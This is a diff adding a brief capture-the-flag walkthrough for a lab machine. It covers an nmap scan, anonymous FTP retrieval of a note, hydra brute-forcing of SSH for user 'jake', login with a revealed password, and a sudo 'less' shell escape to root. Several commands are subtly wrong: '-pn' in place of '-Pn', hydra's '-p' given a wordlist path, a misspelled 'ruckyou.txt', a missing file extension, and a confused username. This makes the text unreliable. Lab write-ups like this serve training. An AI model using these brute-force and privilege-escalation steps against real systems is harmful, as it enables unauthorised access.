@@ -1,0 +1,58 @@
+nmap -sV -pn IP
+
+we have 3 open ports
+
+`ftp IP`
+login as anonymous
+
+download the text file inside the ftp
+
+get note_to_jake.txt
+
+bye
+
+cat note_to_jake
+
+we will get message that contains username: note_to_jake
+
+try ssh login
+
+since we don't know the password lets bruteforce using hydra
+
+
+```hydra -l jake -p /usr/share/wordlists/ruckyou.txt ssh://IP/```
+
+yeahhhhhh
+
+we got the password
+ssh jake@IP
+enter the password you found: 987654321
+
+
+ls
+
+whoami
+ 
+ cd ..
+ cd /home
+ ls
+ cat user.txt
+
+
+
+sudo -l
+
+
+USe GTFObins to elivate priveliage
+
+```sudo less /etc/profile
+!/bin/sh```
+
+
+yeah now you're a root
+
+whoami
+``cat /root/root.txt``
+
+
+DONE!!!
